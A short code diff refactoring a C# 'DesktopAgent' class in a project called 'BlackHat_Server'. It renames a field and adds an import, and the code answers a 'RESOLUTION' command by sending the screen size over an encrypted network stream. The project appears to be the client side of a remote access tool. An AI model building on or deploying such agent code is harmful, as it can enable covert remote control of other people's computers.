@@ -1,6 +1,7 @@
 ﻿using System.Drawing;
 using System.Net.Sockets;
 using System.Threading;
+using System.Windows.Forms;
 using BlackHat_Server.Class;
 using BlackHat_Server.Class.Comunicator;
 using BlackHat_Server.Class.Image_Classes;
@@ -13,7 +14,7 @@ namespace BlackHat_Server.Muduli.Desktop
 
         private readonly MsgFileManager mfm;
         private readonly MsgManager mm;
-        private Size s = SystemInformation.PrimaryMonitorSize;
+        private Size size = SystemInformation.PrimaryMonitorSize;
 
 
         public DesktopAgent(NetworkStream ctor_Stream)
@@ -50,7 +51,7 @@ namespace BlackHat_Server.Muduli.Desktop
                     //SCREEN RES INFO
                     if (cmdSplit[0] == "RESOLUTION")
                     {
-                        var msg = string.Format("{0}|{1}", s.Width, s.Height);
+                        var msg = string.Format("{0}|{1}", size.Width, size.Height);
 
                         mm.SendEncryMessage(msg, 10000);
                     }
